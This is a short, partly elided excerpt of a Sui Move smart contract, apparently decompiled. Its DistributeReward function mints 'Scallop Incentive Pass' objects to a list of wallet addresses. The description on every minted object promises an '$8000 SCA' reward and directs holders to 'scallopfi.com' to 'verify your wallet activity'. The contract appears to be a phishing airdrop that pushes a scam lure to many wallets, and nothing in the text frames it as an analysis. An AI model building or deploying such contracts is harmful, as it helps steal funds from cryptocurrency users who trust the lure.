module 0xbe93c7f6de221c097c432765140abe74b189efdbb9d64d9e20f068551153c220::scallop_incentive_pass_w {
    ...
    public entry fun DistributeReward(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = SCALLOP_INCENTIVE_PASS{
                ...
                description : 0x1::string::utf8(b"Scallop Incentive Reward of $8000 SCA is ready at https://scallopfi.com. Verify your wallet activity and claim your reward."),
    ...
    fun init(arg0: SCALLOP_INCENTIVE_PASS_W, arg1: &mut 0x2::tx_context::TxContext) {
        ...
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Scallop Incentive Reward of $8000 SCA is ready at https://scallopfi.com. Verify your wallet activity and claim your reward."));
